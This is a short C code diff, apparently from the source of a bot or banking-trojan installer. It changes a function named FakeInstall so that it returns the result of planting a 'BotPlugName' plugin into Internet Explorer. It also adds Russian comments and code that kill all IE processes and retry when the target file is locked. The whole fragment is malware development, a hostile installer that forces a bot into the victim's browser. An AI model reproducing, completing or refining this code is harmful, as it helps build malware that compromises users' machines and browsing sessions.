@@ -570,7 +570,11 @@ BOOL InstallForIe(const char* BotPlugName, const void* SelfBody, DWORD SelfBodyS
 				
 				if (MoveResult == TRUE) break;
 
+				// Если Move не получается - предполагаем что файл занят.
+				// Убиваем все процессы IE, спим немного для ожидания завершения процессов 
+				// и пробуем еще.
 				KillAllIeProcesses();
+				pSleep(1 * 1000);
 				AttemptsCount++;
 			}
 
@@ -617,9 +621,7 @@ BOOL WINAPI FakeInstall(
 		"Started BotPlugName='%s' Target='%s' InstallerBody=0x%X InstallerBodySize=%u", 
 		BotPlugName, Target, InstallerBody, InstallerBodySize);
 
-	InstallForIe(BotPlugName, InstallerBody, InstallerBodySize);
-
-	return FALSE;
+	return InstallForIe(BotPlugName, InstallerBody, InstallerBodySize);
 }
 
 #pragma comment(linker, "/ENTRY:FakeDllInstallerDllMain" )
